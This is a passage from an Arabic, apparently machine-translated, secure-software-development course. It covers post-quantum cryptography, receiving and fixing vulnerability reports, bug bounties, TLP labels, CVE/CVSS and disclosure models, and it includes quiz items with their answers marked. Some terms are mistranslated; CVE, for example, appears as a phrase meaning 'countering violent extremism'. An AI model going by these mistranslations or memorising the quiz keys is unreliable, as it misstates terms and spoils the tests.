، تم تطوير العديد من هذه الخوارزميات ويجري تقييمها.

في المقابل ، فإن خوارزميات التشفير المتماثلة الحالية ووظائف التجزئة أقل تأثرا بأجهزة الكمبيوتر الكمومية. تعمل خوارزمية Grover على تسريع الهجمات ضد الأصفار المتماثلة ، مما يقلل من طولها الفعال إلى النصف. هذا يعني أنه يمكن كسر AES 128 بت بواسطة كمبيوتر كمي (سيكون بعد ذلك مكافئا لمفتاح 64 بت اليوم) ، لكن AES 256 بت سيظل آمنا (سيكون مكافئا لمفتاح 128 بت اليوم). لذلك من المتوقع أن يكون استخدام المفاتيح والتجزئة الأطول مناسبا في عالم ما بعد الكم لخوارزميات التشفير المتماثلة ووظائف التجزئة.

#### التواضع مهم في التشفير

ربما يكون الدرس الأكثر أهمية هنا هو أن تكون متواضعا عند استخدام التشفير. تم تطوير العديد من خوارزميات التشفير في الماضي ، فقط ليتم كسرها لاحقا. من الغطرسة الاعتقاد بأن خوارزمياتنا وبروتوكولاتنا الحالية لا يمكن كسرها.

يجب أن يكون لديك بدلا من ذلك خطة للتعامل عندما (وليس إذا) تم كسر خوارزميات وبروتوكولات التشفير الخاصة بك. تأكد من أن جميع المطورين المشاركين يعلمون بهذه الخطة حتى لا يفسدوها (على سبيل المثال ، إذا قمت بتشغيل مشروع OSS ، فضع هذا في **CONTRIBUTING.md** أو ملف مكافئ). باختصار ، خطط للتغيير.

وبالمثل ، اطلب المشورة من الخبراء ، وقم بوزن هذه النصيحة بعناية. يمكن أن تكون الأخطاء في أنظمة التشفير مدمرة ، ويمكن أن تستمر لسنوات عديدة لأنها غير واضحة. يعد الحصول على مراجعة الآخرين وتعليقاتهم البناءة فكرة جيدة بشكل عام ، ولكنه مهم بشكل خاص عند استخدام التشفير.

#### اختبار 3.7: مواضيع أخرى في التشفير

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!] لا يمكن للمهاجمين اكتشاف زمن الوصول ضمن المساواة عبر الشبكة.

[x] حيثما كان ذلك عمليا ، يجب عليك تقليل الوقت الذي يتم فيه فك تشفير البيانات المشفرة عادة.

[ ] إذا تم تطوير أجهزة كمبيوتر كمومية قوية "للأغراض العامة" ، فإنها ستجعل جميع خوارزميات التشفير عديمة الفائدة. {{ محدد: لا. ستجعل أجهزة الكمبيوتر هذه خوارزميات المفتاح العام الشائعة عديمة الفائدة ** والتي تحظى بشعبية في عام 2020. ومع ذلك ، في حين أنها ستخفض إلى النصف طول البت الفعال لخوارزميات التشفير المتماثل ، فإنها لن تجعلها عديمة الفائدة ؛ سيصبح مفتاح 256 بت لخوارزمية التشفير المتماثل بشكل فعال مفتاح 128 بت ، والذي لا يزال آمنا بشكل كاف لمعظم الأغراض. بالإضافة إلى ذلك ، يتم تطوير خوارزميات المفتاح العام الجديدة التي تقاوم الهجمات من أجهزة الكمبيوتر الكمومية هذه. }}

# مواضيع أخرى

يصف هذا الفصل موضوعات حول أساسيات تطوير البرامج الآمنة التي لم تتم تغطيتها في مكان آخر ، بما في ذلك التعامل مع الكشف عن الثغرات الأمنية ، وحالات الضمان ، والأساسيات بعد التطوير ، والأساليب الرسمية ، وقوائم الثغرات الأمنية.

أهداف التعلم:

1. فهم كيفية التعامل بشكل صحيح مع الكشف عن الثغرات الأمنية.

2. ناقش أساسيات حالات الضمان.

3. ناقش أساسيات ما بعد التطوير: التوزيع ، والميدان / النشر ، والعمليات ، والتخلص.

4. احصل على مقدمة موجزة عن الأساليب الرسمية.

5. ألق نظرة على قوائم الثغرات الأمنية العليا (على سبيل المثال ، OWASP Top 10 و CWE Top 25).

## الكشف عن الثغرات الأمنية

### تلقي تقارير الثغرات الأمنية

لسوء الحظ ، حتى بعد بذل قصارى جهدك ، قد يجد شخص ما ثغرة أمنية في البرنامج الذي قمت بتطويره. في هذه الوحدة، سنناقش تلقي تقارير الثغرات الأمنية، بما في ذلك كيفية الاستعداد لتلقي تقارير  الثغرات الأمنية *قبل* العثور على الثغرات الأمنية.

#### فرق الاستجابة لحوادث أمان المنتج (PSIRTs)

إذا كنت جزءا من فريق يطور تطبيقا برمجيا كبيرا داخل مؤسسة واحدة ، فمن المحتمل أن يكون لديك أو يجب أن تفكر في تشكيل مجموعة لمعالجة الحوادث الأمنية المتعلقة بهذا البرنامج. تسمى هذه الفرق أحيانا فريق الاستجابة لحوادث أمان المنتج (PSIRT). يعرف المنتدى غير الربحي لفرق الاستجابة للحوادث والأمن (FIRST) PSIRT بأنه *"كيان داخل منظمة ... يركز على تحديد وتقييم والتخلص من المخاطر المرتبطة بالثغرات الأمنية داخل المنتجات ، بما في ذلك العروض والحلول والمكونات و / أو الخدمات التي تنتجها المؤسسة و / أو تبيعها " (*أولا[: ](https://www.first.org/standards/frameworks/) إطار خدمات فريق الاستجابة لحوادث أمان المنتج (PSIRT)  *وإطار خدمات فريق الاستجابة لحوادث أمن الكمبيوتر (CSIRT)* ** ). توصي FIRST بتشكيل PSIRTs بينما لا تزال المتطلبات قيد التطوير ، ولكن يجب على الأقل تشكيلها قبل الإصدار الأولي للبرنامج. يمكن ل PSIRT الذي يعمل بشكل صحيح تحديد تقرير الثغرات الأمنية الخطيرة للغاية والاستجابة له بسرعة.

غالبا ما تعمل PSIRTs مع فرق الاستجابة لحوادث الكمبيوتر (CSIRTs) ؛ تركز CSIRT على أمن أنظمة الكمبيوتر و / أو الشبكات التي تشكل البنية التحتية للمؤسسة بأكملها ، بينما تركز PSIRTs على منتجات / خدمات محددة. إذا كان لديك واحد (أو ترغب في إنشاء واحد) ، فإن FIRST يوفر أطر عمل مفيدة تصف ما يجب أن تفعله PSIRTs و CSIRTs داخل المنظمة ([إطار خدمات FIRST](https://www.first.org/standards/frameworks/)).

لدى العديد من الحكومات والشركات الكبيرة أيضا متطلباتها وإرشاداتها الخاصة حول كيفية التعامل مع تقارير الضعف. إذا كان مشروعك أحد جهودهم ، فستحتاج إلى اتباع هذه المتطلبات والنظر في إرشاداته.

دليل قصير بسيط هو [ورقة الغش في الكشف عن الثغرات الأمنية OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html). يوفر هذا المستند القصير إرشادات مفيدة لكل من الباحثين الأمنيين (الذين يجدون ثغرات أمنية) والمؤسسات (الذين يتلقون تقارير الثغرات الأمنية).

هناك العديد من المستندات المفيدة الأخرى التي تناقش الكشف عن الثغرات الأمنية. وعلى وجه الخصوص:

* [*دليل CERT للإفصاح المنسق عن الثغرات الأمنية*](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure) ، بقلم ألين هاوسهولدر ، 2019. في هذا المستند ، يكون "البائع" هو المؤسسة التي تصدر البرنامج وتحتاج إلى التعرف على الثغرة الأمنية.

*  [*إرشادات وممارسات FIRST لتنسيق نقاط الضعف متعددة الأطراف والإفصاح عنها*](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1) [https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)

مجموعة عمل الكشف عن الثغرات الأمنية [لمؤسسة أمان المصدر المفتوح (OpenSSF) ](https://github.com/ossf/wg-vulnerability-disclosures)
دليلا [للإفصاح المنسق عن الثغرات الأمنية لمشاريع البرمجيات مفتوحة المصدر](https://github.com/ossf/oss-vulnerability-guide). إذا كنت تحتفظ بمشروع OSS ، فقم بتطبيق هذا الدليل حتى تكون مستعدا لتقارير الثغرات الأمنية قبل حدوثها.


في بقية هذه الوحدة ، سنناقش بعض القضايا الرئيسية لقبول تقارير الضعف.

#### اذكر علنا كيفية إرسال تقارير الثغرات الأمنية

يجب أن تخبر الآخرين ، علنا ، بكيفية إرسال تقارير الضعف ... ويجب أن يكون من السهل للغاية العثور على هذه المعلومات. خلاف ذلك ، لن يقوم المراسلون المحتملون بإبلاغك بنقاط الضعف ، أو قد يكون هناك تأخير كبير أثناء محاولة المشروع معرفة كيفية تلقي تقرير. هذا هو الوقت الضائع حيث يكون الوقت في كثير من الأحيان جوهريا. في عام 2019 ، كان الفشل في الإعلان عن كيفية إرسال تقارير الثغرات الأمنية هو السبب الأكثر شيوعا #1 لعدم حصول مشاريع برمجيات المصدر المفتوح على شارة تمرير أفضل ممارسات OpenSSF ** ([*شارة أفضل الممارسات لمبادرة البنية التحتية الأساسية (CII) في عام 2019 *](https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf)، بواسطة David A. Wheeler).

من ناحية ، هذا المطلب سهل. حدد ما هو اصطلاح الإبلاغ الخاص بك ، واجعل من السهل العثور على هذه المعلومات. فيما يلي بعض الاتفاقيات الشائعة:

1. تدعم العديد من الشركات والمشاريع عنوان بريد إلكتروني للنموذج security@example.com **** أو **abuse@example.com**.

2. الاصطلاح الشائع في مشاريع برمجيات المصدر المفتوح هو توفير هذه المعلومات في ملف باسم **SECURITY.md** في جذر المستودع أو  دليل **المستندات /** الدليل. ستقوم مواقع مثل GitHub بتمييز هذا الملف إذا كان موجودا وتشجع على إنشائه. أضف ارتباطا من  ملف **README.md** إلى ملف **SECURITY.md** هذا.

3. إذا كان المشروع يحتوي على موقع ويب أو ينفذه ، فإن التوصية الشائعة هي إضافة ** ملف أمان** .txt على  موقع الويب على / ** security.txt  أو ** /.well-known/security.txt.**** لمعرفة المزيد، تفضل بزيارة [securitytxt.org](https://securitytxt.org/).

يتمثل أحد التحديات في أن المهاجمين مهتمون جدا أيضا بالحصول على تقارير الثغرات الأمنية ، لأنهم يريدون استغلال تلك الثغرات الأمنية حتى يقوم الجميع بتثبيت إصلاحاتها أو تخفيفها. لذلك ، من المهم عادة أن يكون لديك آلية للإبلاغ عن نقاط الضعف التي تمنع المهاجمين من الحصول على هذه المعلومات أيضا قبل توزيع التصحيح. قد يكون من الصعب القيام بذلك في بعض الأحيان:

1. أنظمة البريد الإلكتروني بشكل عام ليست مشفرة من طرف إلى طرف. لا يتم استخدام أنظمة البريد الإلكتروني التي تدعم التشفير من طرف إلى طرف (على سبيل المثال ، OpenPGP و S / MIME) على نطاق واسع ، وقد يكون من الصعب استخدامها ، و / أو يتم استخدامها بشكل أساسي فقط داخل مجتمعات محددة.

2. تتوقع العديد من أنظمة الاتصالات الأخرى للاتصال الآمن 1 على 1 أن الأطراف تعرف بعضها البعض بالفعل ، وهو ما لا يحدث غالبا في الإبلاغ عن نقاط الضعف.

3. تعمل مشاريع برمجيات المصدر المفتوح بشكل عام في العلن، لذا فإن منتديات الإبلاغ والمناقشة العادية (مثل أدوات تتبع المشكلات وأنظمة الدردشة وما إلى ذلك) قد تسمح للعديد من الأشخاص (أو الجميع) بمشاهدة المناقشة حول ثغرة أمنية، حتى لو لم يكن من المفترض أن تكون معروفة للجمهور.

إذا كنت لا تريد أن يستغل المهاجمون على الفور الثغرات الأمنية التي تم الإبلاغ عنها لك ، فيجب عليك استخدام نوع من التشفير للتقرير الأولي. أحد الحلول غير الكاملة ولكنه مفيد هو استخدام أنظمة البريد الإلكتروني التي تدعم STARTTLS. يدعم معظم مزودي البريد الإلكتروني الكبار (مثل GMail) والعديد من الشركات STARTTLS. يوفر STARTTLS *تشفير طبقة النقل *، أي أن رسائل البريد الإلكتروني مشفرة *بين* مرحلات البريد الإلكتروني. تشفير طبقة النقل ليس آمنا مثل التشفير من طرف إلى طرف ، لأنه يتم فك تشفير رسائل البريد الإلكتروني في نقاط مختلفة. بالإضافة إلى ذلك ، غالبا ما يتم نشر STARTTLS على أنه TLS *انتهازي* - مما يعني أن المهاجم النشط الذي يتحكم في أجهزة توجيه شبكة معينة أو مرحلات بريد إلكتروني قد يكون قادرا على تعطيل هذا التشفير لفترة من الوقت. ومع ذلك ، فإن استخدام موفري البريد الإلكتروني الذين يدعمون STARTTLS بشفافية يوفر الحماية من العديد من أنواع الهجمات الأكثر شيوعا على الاتصالات ، بينما يكون سهل الاستخدام للغاية.

يجب عليك أيضا استخدام التشفير للتواصل بين المطورين الرئيسيين إذا كنت لا تريد أن يعرف المهاجمون ما يجري. ومع ذلك ، غالبا ما يعرف المطورون بعضهم البعض ، لذلك عادة ما يكون تحقيق ذلك أسهل بكثير.

#### مراقبة الثغرات الأمنية، بما في ذلك التبعيات الضعيفة

كما ذكرنا سابقا ، راقب نقاط الضعف حول برنامجك وجميع المكتبات المضمنة فيه. يمكنك استخدام تنبيهات Google لتنبيهك بشأن برنامجك من مصادر الأخبار المختلفة. استخدم أداة تحليل تكوين البرامج (SCA) / تحليل الأصل لتنبيهك بشأن الثغرات الأمنية المعروفة حديثا في تبعياتك.

كما ذكرنا سابقا ، فإن قائمة مواد البرنامج (SBOM) هي مخزون متداخل يحدد مكونات البرنامج التي تشكل جزءا أكبر من البرنامج. عندما يتوفر SBOM لمكون تستخدمه، غالبا ما يكون من الأسهل استخدام هذه البيانات للمساعدة في اكتشاف الثغرات الأمنية المعروفة. العديد من النظم الإيكولوجية لها تنسيقات SBOM خاصة بالنظام البيئي. هناك أيضا بعض تنسيقات SBOM التي تدعم النظم البيئية التعسفية: [تبادل بيانات حزمة البرامج (SPDX) ](https://spdx.dev/)ومعرف [البرنامج (SWID)](https://csrc.nist.gov/Projects/Software-Identification-SWID/) و [CycloneDX](https://github.com/CycloneDX/specification).

#### ضع في اعتبارك إنشاء برنامج مكافأة الأخطاء

من الأساليب المستخدمة على نطاق واسع لتشجيع الإبلاغ عن نقاط الضعف برنامج *مكافأة الأخطاء* ، حيث تدفع للصحفيين للإبلاغ عن العيوب المهمة بشكل خاص. يمكن أن تكون هذه طريقة فعالة من حيث التكلفة لتشجيع الأشخاص على الإبلاغ عن نقاط الضعف لك بمجرد العثور على جميع نقاط الضعف "التي يسهل العثور عليها" نسبيا وإصلاحها. إذا كنت لا ترغب في إدارة مثل هذا البرنامج بنفسك ، فهناك العديد من الشركات التي يمكنها القيام بذلك نيابة عنك مقابل رسوم.

تأكد من تحديد نطاق وشروط أي برامج مكافأة الأخطاء بوضوح ([الكشف عن ثغرات OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). حدد ما ستدفعه مقابل ، بما في ذلك الحد الأدنى والحد الأقصى للنطاق. على سبيل المثال، *"$X-$Y ثغرة أمنية تؤدي مباشرة إلى تنفيذ تعليمات برمجية عن بعد دون الحاجة إلى بيانات اعتماد تسجيل الدخول."*  إذا كان هناك حد أقصى يمكنك إنفاقه في السنة ، فقل ذلك ، وأشر إلى المبلغ الإجمالي والتقويم المستخدم وما سيحدث للتقارير بعد استخدام التمويل السنوي. وضح أيضا من هو غير المؤهل ، على سبيل المثال ، مطوري البرنامج و / أو موظفي الشركات التي تطور البرنامج.

ومع ذلك ، احذر: يمكن أن يكون برنامج مكافأة الأخطاء مضيعة لا تصدق للمال ما لم يتم العثور على نقاط الضعف التي يسهل العثور عليها وإصلاحها أولا. كما لاحظت كاتي موسوريس * ، "ليست كل الأخطاء متساوية" *؛ العديد من العيوب (مثل معظم عيوب XSS) من السهل اكتشافها وإصلاحها ، و *"يجب أن تجد هذه الأخطاء بسهولة بنفسك أيضا". * يعد استخدام برنامج مكافأة الأخطاء للعثور على نقاط الضعف التي يسهل العثور عليها مكلفا للغاية و *"ليس إدارة مخاطر مناسبة". * حتى أنها أشارت إلى حالة انتهى فيها الأمر بشركة إلى دفع 29000 دولار في الساعة لباحث أمني للعثور على عيوب بسيطة معروفة. ابحث عن الأخطاء البسيطة وقم بإصلاحها أولا  ، *ومن ثم* قد يكون برنامج مكافأة الأخطاء منطقيا ([*الاعتماد على مكافآت الأخطاء "إدارة المخاطر غير المناسبة": كاتي موسوريس ، *](https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/)بقلم Stilgherrian ، 2019).

### الاستجابة للثغرة الأمنية وإصلاحها في الوقت المناسب

بالطبع ، بمجرد تلقي تقرير الضعف ، يجب الاستجابة له وإصلاحه في الوقت المناسب. توصي OWASP بما يلي ([الكشف عن ثغرات OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)):

* الرد على التقارير في جدول زمني معقول.

* التواصل بصراحة مع الباحثين.

* [فعل] عدم التهديد باتخاذ إجراءات قانونية ضد الباحثين.

يجب أن تكون قادرا على فرز تقارير الثغرات الأمنية بسرعة ؛ لن تنطبق بعض التقارير على برنامجك أو ليست نقاط ضعف حقا. من الشائع جدا أن تحتاج إلى طرح المزيد من الأسئلة لفهم الثغرة الأمنية حقا.

#### إصلاح الثغرة الأمنية

بمجرد تحديد أنها بالفعل ثغرة أمنية ، ستحتاج إلى إصلاحها.

إذا كنت تريد أن تكون قادرا على مناقشة التقارير في مجموعة مقيدة - ومعظم المجموعات تفعل ذلك - فيجب عليك إعداد ذلك مسبقا.

تأكد من أنه يمكنك بسرعة الوقوف في بيئة اختبار عمل لأي إصدار وبيئة مدعومة من البرنامج. لذا تأكد من أن لديك تحكما جيدا في إصدار الكود المصدري ، وتأكد أيضا من أنه يمكنك الوقوف بسرعة في بيئات التطوير والاختبار.

عند إصلاح ثغرة أمنية ، تحقق لمعرفة ما إذا كان نفس النوع من الثغرة الأمنية موجودا في مواقف مماثلة في البرنامج. خلاف ذلك ، سوف ينتهي بك الأمر إلى إنشاء العديد من التصحيحات.

إذا تسبب التحديث في حدوث مشكلات ، فسيرفضه الأشخاص ويتعلمون عدم قبول أي تحديثات مستقبلية منك. يجب أن يتجنب أي إصلاح مقترح عدم التوافق مع الإصدارات السابقة إذا كان ذلك ممكنا. يجب أن تكون أيضا ذات جودة عالية. هذا يعني أنك بحاجة إلى ** مجموعة اختبار آلية قوية قبل إصدار البرنامج ، وأن يكون لديك أي أجهزة مطلوبة لتنفيذه (إذا كانت الاختبارات تحتاج إلى أجهزة خاصة). أضف اختبارات تلقائية تتعلق بما تقوم بتغييره ، للتأكد من أنه يعمل بالفعل على حل المشكلة وأيضا للتحقق من أن التغيير لا يؤثر سلبا على أي شيء آخر.

![نص بديل للصورة](worst.png)

**أسوأ شيء يمكن أن يحدث ، **تم استرداده من [xkcd.com](https://xkcd.com/2261/) ، مرخص بموجب [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

#### الحد من الإفصاح وبروتوكول إشارات المرور الأول (TLP)

عند مناقشة ثغرة أمنية ، غالبا ما يكون من المهم مناقشة المعلومات التفصيلية ، ولكن في نفس الوقت إخبار الأشخاص بالحد من الكشف عن بعض المعلومات لفترة من الزمن. بالإضافة إلى ذلك ، أصبح من الشائع أن يكون هناك العديد من الأطراف المختلفة المشاركة في الثغرة الأمنية: قد يكون هناك العديد من الموردين (بما في ذلك البائعين) الذين ينفذون البرامج مع الثغرة الأمنية والموزعين والمنظمات المشاركة في توزيع المعلومات حول الثغرة الأمنية.

طورت FIRST نظاما بسيطا لوضع العلامات يسمى [بروتوكول إشارات المرور](https://www.first.org/tlp/) (TLP) والذي يستخدم غالبا للإشارة إلى من يمكن مشاركة المعلومات معه. هنا ملخص موجز. يحتوي TLP على أربع قيم ألوان للإشارة إلى حدود المشاركة ، والتي يتم وضعها على النحو التالي:

1. في البريد الإلكتروني: يوجد لون TLP في سطر الموضوع وأيضا في النص الأساسي قبل المعلومات المعينة.

2. في المستندات: يكون لون TLP في رأس وتذييل كل صفحة ، وعادة ما يكون مضبوطا إلى اليمين.

يظهر لون TLP بأحرف كبيرة بعد "TLP:**" ، لذلك سترى ** TLP: RED أو TLP: AMBER أو ** TLP: GREEN  **أو ******TLP**: **WHITE.** هذه الألوان لها المعنى التالي:

* **TLP:RED** = ليس للإفصاح، يقتصر على المشاركين فقط.

* **TLP:AMBER** = إفصاح محدود ، يقتصر على منظمات المشاركين.

* **TLP:GREEN** = إفصاح محدود ، يقتصر على المجتمع.

* **TLP: WHITE**  = الإفصاح غير محدود.



#### احصل على CVSS وحوسبة CVSS

يجب عليك طلب مكافحة التطرف العنيف عند الاقتضاء ولم يتم طلبها بالفعل ([الكشف عن ثغرات OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). عادة ، ستبدأ هذه العملية بمجرد التحقق من أن التقرير يمثل بالفعل ثغرة أمنية ، وبالتالي ستفعل ذلك في وقت واحد مع إصلاحه. إذا طلبت CVE، فيجب عليك أيضا حساب درجة نظام تسجيل نقاط الضعف الشائعة (CVSS) الخاصة بالثغرة الأمنية. CVSS هو تقدير تقريبي لشدة الثغرة الأمنية.

سبب CVEs و CVSS بسيط: المؤسسات غارقة في تحديثات البرامج ، وتحتاج إلى معلومات لمساعدتها على تحديد أولويات التحديثات. CVE و CVSS ليست مثالية ، لكنها تستخدم على نطاق واسع وتعتمد عليها. وجد مسح معهد بونيمون [*لتكاليف وعواقب الفجوات في استجابات الضعف*](https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html) (2019) ما يلي:

* *"أفاد ما يقرب من نصف المشاركين (48٪) أن مؤسساتهم تعرضت لخرق واحد أو أكثر للبيانات في العامين الماضيين."*

* *"قال 60٪ من ضحايا الخرق إنهم تعرضوا للاختراق بسبب [a] الضعف المعروف حيث لم يتم تطبيق التصحيح"*

* *"تسجيل CVSS ... غالبا ما يكون المقياس الوحيد لتحديد أولويات التصحيح [على الرغم من أنه] يستبعد أهمية الأصول والأنظمة كجزء من الاستجابة للثغرات الأمنية ".*

* *"44٪ من المستجيبين يقولون إن مؤسساتهم تستخدم الأتمتة للمساعدة في إدارة الثغرات الأمنية وتصحيحها [(تحديد الأولويات والترقيع في المقام الأول)]"*

* *"تقلل الأتمتة من الوقت اللازم للاستجابة لنقاط الضعف ... 80٪ من المنظمات ... التي تستخدم الأتمتة تقول إن لديها القدرة على الاستجابة لنقاط الضعف في إطار زمني أقصر.* ومع ذلك،  تعتمد هذه الأتمتة على مجموعة متنوعة من العوامل، بما في ذلك (في معظم الحالات) تعيين CVE عند وجود ثغرة أمنية.

يستخدم CVSS على نطاق واسع ، لأن هناك حاجة إلى تحديد أولويات واضحة ، ولكن CVSS يتم انتقاده أيضا على نطاق واسع (على سبيل المثال [* ، شدة نقاط الضعف المكسورة*](https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/) ، بقلم Josh Bressers ، 2020). قد يتم تطوير إصدار جديد من CVSS (بعد الإصدار 3) ، أو بديل له ، و / أو يصبح مستخدما على نطاق واسع في المستقبل.

#### حرر التحديث وأخبر العالم

بمجرد أن يصبح الإصلاح جاهزا ، حرره. ستحتاج إلى إخبار العالم أن البرنامج قد تم إصلاحه ، وأن تفعل كل ما في وسعك لتشجيع الاستيعاب السريع للإصدار الثابت. توصي OWASP بأن ينشر الموردون إرشادات أمنية واضحة وسجلات تغيير ، وكذلك أن يقدم الموردون ائتمانا لمكتشف الثغرات الأمنية ([الكشف عن الثغرات الأمنية OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)).

إذا كانت هناك حلول يمكن تطبيقها دون تحديث البرنامج ، فتأكد من ملاحظتها. هذا مهم بشكل خاص إذا:

* من المحتمل أن يكون هناك العديد من المستخدمين الذين لا يستطيعون تحديث برامجهم ، أو

* الثغرة الأمنية معروفة للجمهور ، ولكن لن يتم إصدار التصحيح لبعض الوقت.

تأكد من سهولة التحديث تلقائيا إلى الإصدار الثابت من البرنامج. إذا كان النظام الأساسي للبرامج لا يوفر إصدارات تصحيح تلقائية أو تثبيتا ، ففكر في تنفيذ واحد بنفسك. يجب أن يكون المستخدمون قادرين على تلقي الإصلاحات بسرعة وتلقائيا ، ما لم يقوموا بإلغاء الاشتراك صراحة في التحديثات.

تأكد دائما من نسب الفضل والشكر للمراسلين عن نقاط الضعف ، ما لم يطلبوا خلاف ذلك. من الوقاحة عدم تقديم الائتمان ، ويقدم العديد من مراسلي الضعف تقارير *في المقام الأول* للحصول على الائتمان. والأسوأ من ذلك أن المراسلين قد يكونون أقل تعاونا في المستقبل إذا لم يحصلوا على الائتمان المناسب.

#### اختبار 4.1: الاستجابة للثغرة الأمنية وإصلاحها في الوقت المناسب

\>\>ما معنى **TLP:RED**؟<<

(!x) ليس للإفصاح ، يقتصر على المشاركين فقط.

( ) الكشف المحدود والحصري على منظمات المشاركين.

( ) الكشف المحدود ، يقتصر على المجتمع.

( ) الإفصاح غير محدود.

### إرسال تقارير الثغرات الأمنية إلى الآخرين

بمجرد الانتهاء من هذه الدورة ، من المرجح أن تكون قادرا على اكتشاف نقاط الضعف في البرنامج. في هذه الوحدة ، سنناقش كيفية إرسال تقارير الثغرات الأمنية إلى الآخرين.

  توصي [ورقة الغش في الكشف عن الثغرات الأمنية OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html) بأن الباحثين الأمنيين (الذين يجدون ثغرات أمنية) يجب عليهم:

* تأكد من أن أي اختبار قانوني ومصرح به.

* احترم خصوصية الآخرين.

* بذل جهود معقولة للاتصال بفريق الأمن في المنظمة.

* قدم تفاصيل كافية للسماح بالتحقق من الثغرات الأمنية وإعادة إنتاجها.

* لا تطلب مدفوعات أو مكافآت للإبلاغ عن نقاط الضعف خارج برنامج مكافأة الأخطاء المعمول به.

يمكن أن يكون الإبلاغ عن ثغرة أمنية وجدتها معقدا بشكل مدهش. إذا كان هناك مورد واحد ، فيمكنك إبلاغ هذا المورد فقط. لكن في بعض الأحيان يكون هناك العديد من الموردين وأصحاب المصلحة الآخرين المعنيين. هناك أيضا طرق مختلفة يمكنك من خلالها اختيار الإبلاغ عن ثغرة أمنية.

#### نماذج التقارير

هناك عدة أنواع مختلفة من نماذج الإفصاح:

1. ****<br> الإفصاح الخاص*"في نموذج الإفصاح الخاص، يتم الإبلاغ عن الثغرة الأمنية بشكل خاص إلى المنظمة. قد تختار المنظمة نشر تفاصيل نقاط الضعف ، ولكن يتم ذلك وفقا لتقدير المنظمة ، وليس الباحث ، مما يعني أن العديد من نقاط الضعف قد لا يتم الإعلان عنها أبدا. تتطلب غالبية برامج مكافأة الأخطاء أن يتبع الباحث هذا النموذج. المشكلة الرئيسية في هذا النموذج هي أنه إذا كان البائع لا يستجيب ، أو قرر عدم إصلاح الثغرة الأمنية ، فقد لا يتم نشر التفاصيل أبدا. تاريخيا ، أدى ذلك إلى أن يضيق الباحثون ذرعا بتجاهل الشركات ومحاولة إخفاء نقاط الضعف ، مما أدى بهم إلى نهج الإفصاح الكامل ". * ([الكشف عن ثغرات OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html))

2. ****<br> الإفصاح الكامل*"مع نهج الإفصاح الكامل، يتم الإعلان عن التفاصيل الكاملة للثغرة الأمنية بمجرد تحديدها. هذا يعني أن التفاصيل الكاملة (بما في ذلك أحيانا رمز الاستغلال) متاحة للمهاجمين ، غالبا قبل توفر التصحيح. يستخدم نهج الإفصاح الكامل في المقام الأول استجابة لتجاهل المنظمات لنقاط الضعف المبلغ عنها ، من أجل الضغط عليها لتطوير ونشر الإصلاح. هذا يجعل نهج الإفصاح الكامل مثيرا للجدل للغاية ، وينظر إليه على أنه غير مسؤول من قبل العديد من الناس. بشكل عام ، يجب اعتباره فقط كملاذ أخير ، عندما تفشل جميع الطرق الأخرى ، أو عندما يكون رمز الاستغلال متاحا للجمهور بالفعل "* ([الكشف عن ثغرات OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). سبب آخر للنظر في الكشف الكامل هو إذا كان هناك سبب للاعتقاد بأن المورد ضار عمدا. يمنح الإبلاغ عن ثغرة أمنية لمورد ضار فقط المورد الضار مزيدا من الوقت لاستغلال الثغرة الأمنية.

3. ** الإفصاح المنسق (يسمى تاريخيا الإفصاح المسؤول) ** الإفصاح المنسق<br> *"يحاول إيجاد أرضية مشتركة معقولة بين هذين النهجين. ... يتم إعداد التقرير الأولي بشكل خاص ، ولكن مع نشر التفاصيل الكاملة بمجرد إتاحة التصحيح (أحيانا مع تأخير لإتاحة مزيد من الوقت لتثبيت التصحيحات). * ([الكشف عن ثغرات OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). تاريخيا ، كان هذا يسمى *الإفصاح المسؤول* ، ولكن هذا مصطلح متحيز ، ويوصي صانعه الأصلي الآن بتسميته بالكشف المنسق بدلا من ذلك. من **المهم** أن يكون هناك **حد زمني** قبل الكشف عن الثغرة الأمنية من جانب واحد. وبدون حد زمني، يكون هذا مطابقا أساسا للإفصاح الخاص، لأن المورد قد لا يكون لديه حافز يذكر لإصلاح الثغرة الأمنية.

4. **الإفصاح للمهاجمين**<br>يعمل بعض الباحثين في المنظمات التي تهاجم أنظمة الآخرين. يبيع باحثون آخرون نقاط الضعف لمثل هذه المنظمات ، أو للوسطاء الذين يبيعون نقاط الضعف بعد ذلك. القيام بذلك أمر مثير للجدل ، خاصة عندما يتم بيعها للوسطاء الذين لا يكشفون بوضوح عن من يشتري نقاط الضعف بالضبط. يختلف تأثير القيام بذلك ، لأن هناك تنوعا كبيرا في المنظمات التي تدفع مقابل نقاط الضعف. وتشمل هذه المنظمات إنفاذ القانون في مختلف البلدان، والجيوش في مختلف البلدان، والجريمة المنظمة، و/أو الجماعات الإرهابية. يجب على أي شخص يوفر نقاط ضعف للمهاجمين أن يفكر في الآثار الأخلاقية. على وجه الخصوص ، يجب أن تفكر في ما يحتمل أن يفعله المهاجمون بهذه الثغرات الأمنية. هل لديك ثقة في أن المهاجمين لن يستخدموا نقاط الضعف بما يتعارض مع حقوق الإنسان؟ هل ستضر بأشخاص أو مجموعات معينة مثل الأقليات العرقية أو المنشقين السياسيين أو الصحفيين؟ إذا كشفت عن نقاط الضعف للمهاجمين ، 